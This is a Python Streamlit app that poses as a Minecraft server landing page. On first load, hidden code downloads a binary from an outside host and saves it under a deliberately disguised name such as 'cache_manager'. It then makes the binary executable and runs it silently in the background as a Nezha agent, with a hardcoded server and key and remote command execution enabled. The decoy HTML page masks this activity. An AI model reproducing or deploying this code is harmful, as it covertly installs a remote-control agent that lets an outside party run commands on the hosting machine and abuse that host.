import os
import time
import subprocess
import platform
import random
import streamlit as st
import streamlit.components.v1 as components

# Environment variables
FILE_PATH = os.environ.get('FILE_PATH', '.cache')
NEZHA_SERVER = os.environ.get('NEZHA_SERVER', 'nezha.loc.cc:443')
NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
NEZHA_KEY = os.environ.get('NEZHA_KEY', '4z0HWnSGJtKFtKOlfJxSkNC3F8PIJ448')
UUID = os.environ.get('UUID', 'deef2009-c4e2-4f01-a7d9-0d40b468d258')

# Random file names for disguise
DISGUISE_NAMES = ['cache_manager', 'session_handler', 'task_worker', 'log_rotator', 'health_check']

def get_random_name():
    return random.choice(DISGUISE_NAMES)

def create_directory():
    if not os.path.exists(FILE_PATH):
        os.makedirs(FILE_PATH)

def get_system_architecture():
    architecture = platform.machine().lower()
    if 'arm' in architecture or 'aarch64' in architecture:
        return 'arm'
    else:
        return 'amd'

def download_file(file_name, file_url):
    file_path = os.path.join(FILE_PATH, file_name)
    try:
        import requests
        response = requests.get(file_url, stream=True, timeout=30)
        response.raise_for_status()
        
        with open(file_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        return True
    except:
        if os.path.exists(file_path):
            os.remove(file_path)
        return False

def get_download_url(architecture):
    if not NEZHA_SERVER or not NEZHA_KEY:
        return None
    
    if NEZHA_PORT:
        return "https://arm64.ssss.nyc.mn/agent" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/agent"
    else:
        return "https://arm64.ssss.nyc.mn/v1" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/v1"

def authorize_files(file_path):
    if os.path.exists(file_path):
        try:
            os.chmod(file_path, 0o775)
        except:
            pass

def exec_cmd(command):
    try:
        subprocess.Popen(
            command, 
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except:
        pass

def run_agent():
    if not NEZHA_SERVER or not NEZHA_KEY:
        return
    
    architecture = get_system_architecture()
    disguise_name = get_random_name()
    url = get_download_url(architecture)
    
    if not url:
        return
    
    if not download_file(disguise_name, url):
        return
    
    agent_path = os.path.join(FILE_PATH, disguise_name)
    authorize_files(agent_path)
    
    port = NEZHA_SERVER.split(":")[-1] if ":" in NEZHA_SERVER else ""
    tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']

    if NEZHA_PORT:
        nezha_tls_flag = '--tls' if NEZHA_PORT in tls_ports else ''
        command = f"nohup {agent_path} -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} {nezha_tls_flag} >/dev/null 2>&1 &"
    else:
        nezha_tls = "true" if port in tls_ports else "false"
        config_yaml = f"""client_secret: {NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 4
server: {NEZHA_SERVER}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: {nezha_tls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: {UUID}"""
        
        config_path = os.path.join(FILE_PATH, 'config.yaml')
        with open(config_path, 'w') as f:
            f.write(config_yaml)
        
        command = f"nohup {agent_path} -c \"{config_path}\" >/dev/null 2>&1 &"
    
    exec_cmd(command)

# 初始化后台任务（只运行一次）
if 'initialized' not in st.session_state:
    create_directory()
    run_agent()
    st.session_state.initialized = True

# Streamlit 页面配置
st.set_page_config(
    page_title="Minecraft Server",
    page_icon="⛏️",
    layout="wide"
)

# 隐藏 Streamlit 默认元素
st.markdown("""
<style>
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}
    .stApp {
        margin: 0;
        padding: 0;
    }
</style>
""", unsafe_allow_html=True)

# 完整的 HTML 页面
html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minecraft Server</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a472a 0%, #2d5016 50%, #1a472a 100%);
            min-height: 100vh;
            color: #fff;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 40px 20px;
        }

        header {
            text-align: center;
            margin-bottom: 40px;
        }

        .logo {
            font-size: 48px;
            font-weight: bold;
            text-shadow: 4px 4px 0 #000, 2px 2px 0 #333;
            letter-spacing: 2px;
            margin-bottom: 10px;
        }

        .logo span {
            color: #5c913b;
        }

        .subtitle {
            font-size: 18px;
            opacity: 0.9;
        }

        .server-card {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            border: 3px solid #5c913b;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .server-status {
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 25px;
        }

        .status-indicator {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .status-dot {
            width: 15px;
            height: 15px;
            border-radius: 50%;
            background: #4ade80;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .status-text {
            font-size: 18px;
            font-weight: bold;
            color: #4ade80;
        }

        .players-online {
            background: rgba(92, 145, 59, 0.3);
            padding: 10px 20px;
            border-radius: 8px;
            font-size: 16px;
        }

        .server-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
        }

        .info-item {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 8px;
            text-align: center;
        }

        .info-label {
            font-size: 14px;
            opacity: 0.7;
            margin-bottom: 8px;
            text-transform: uppercase;
        }

        .info-value {
            font-size: 20px;
            font-weight: bold;
            color: #5c913b;
        }

        .copy-btn {
            background: #5c913b;
            border: none;
            color: #fff;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            margin-left: 10px;
            transition: background 0.3s;
        }

        .copy-btn:hover {
            background: #4a7a2f;
        }

        .copy-btn:active {
            transform: scale(0.95);
        }

        .how-to-join {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 12px;
            padding: 30px;
            border: 3px solid #444;
        }

        .how-to-join h2 {
            margin-bottom: 20px;
            color: #5c913b;
        }

        .steps {
            list-style: none;
        }

        .steps li {
            padding: 15px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .steps li:last-child {
            border-bottom: none;
        }

        .step-number {
            background: #5c913b;
            width: 35px;
            height: 35px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            flex-shrink: 0;
        }

        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-top: 30px;
        }

        .feature {
            background: rgba(92, 145, 59, 0.2);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border: 2px solid transparent;
            transition: border-color 0.3s;
        }

        .feature:hover {
            border-color: #5c913b;
        }

        .feature-icon {
            font-size: 32px;
            margin-bottom: 10px;
        }

        .feature-name {
            font-size: 14px;
            font-weight: bold;
        }

        footer {
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            opacity: 0.7;
        }

        .discord-btn {
            display: inline-block;
            background: #5865F2;
            color: #fff;
            padding: 12px 30px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: bold;
            margin-top: 20px;
            transition: background 0.3s;
        }

        .discord-btn:hover {
            background: #4752c4;
        }

        @media (max-width: 600px) {
            .logo {
                font-size: 32px;
            }
            
            .server-status {
                flex-direction: column;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">CRAFT<span>WORLD</span></div>
            <p class="subtitle">Survival Multiplayer Server</p>
        </header>

        <div class="server-card">
            <div class="server-status">
                <div class="status-indicator">
                    <div class="status-dot"></div>
                    <span class="status-text">SERVER ONLINE</span>
                </div>
                <div class="players-online">👥 5 / 50 Players</div>
            </div>

            <div class="server-info">
                <div class="info-item">
                    <div class="info-label">Server Address</div>
                    <div class="info-value">
                        sk1.liquidnodes.online
                        <button class="copy-btn" onclick="copyIP()">Copy</button>
                    </div>
                </div>
                <div class="info-item">
                    <div class="info-label">Port</div>
                    <div class="info-value">25663</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Version</div>
                    <div class="info-value">1.20.4</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Game Mode</div>
                    <div class="info-value">Survival</div>
                </div>
            </div>
        </div>

        <div class="how-to-join">
            <h2>📖 How to Join</h2>
            <ol class="steps">
                <li>
                    <span class="step-number">1</span>
                    <span>Launch Minecraft Java Edition (Version 1.20.4)</span>
                </li>
                <li>
                    <span class="step-number">2</span>
                    <span>Click "Multiplayer" from the main menu</span>
                </li>
                <li>
                    <span class="step-number">3</span>
                    <span>Click "Add Server" button</span>
                </li>
                <li>
                    <span class="step-number">4</span>
                    <span>Enter server address: <strong>sk1.liquidnodes.online</strong></span>
                </li>
                <li>
                    <span class="step-number">5</span>
                    <span>Click "Done" and join the server!</span>
                </li>
            </ol>
        </div>

        <div class="features">
            <div class="feature">
                <div class="feature-icon">⚔️</div>
                <div class="feature-name">PvP Arena</div>
            </div>
            <div class="feature">
                <div class="feature-icon">🏠</div>
                <div class="feature-name">Land Claim</div>
            </div>
            <div class="feature">
                <div class="feature-icon">💰</div>
                <div class="feature-name">Economy</div>
            </div>
            <div class="feature">
                <div class="feature-icon">🎁</div>
                <div class="feature-name">Daily Rewards</div>
            </div>
            <div class="feature">
                <div class="feature-icon">👑</div>
                <div class="feature-name">Ranks</div>
            </div>
            <div class="feature">
                <div class="feature-icon">🌍</div>
                <div class="feature-name">World Border</div>
            </div>
        </div>

        <div style="text-align: center;">
            <a href="#" class="discord-btn">💬 Join our Discord</a>
        </div>

        <footer>
            <p>© 2024 uptime Server. All rights reserved.</p>
            <p>Not affiliated with Mojang Studios.</p>
        </footer>
    </div>

    <script>
        function copyIP() {
            navigator.clipboard.writeText('sk1.liquidnodes.online').then(() => {
                const btn = document.querySelector('.copy-btn');
                btn.textContent = 'Copied!';
                setTimeout(() => {
                    btn.textContent = 'Copy';
                }, 2000);
            });
        }
    </script>
</body>
</html>
"""

# 使用 components.html 渲染完整的 HTML 页面
components.html(html_content, height=1200, scrolling=True)
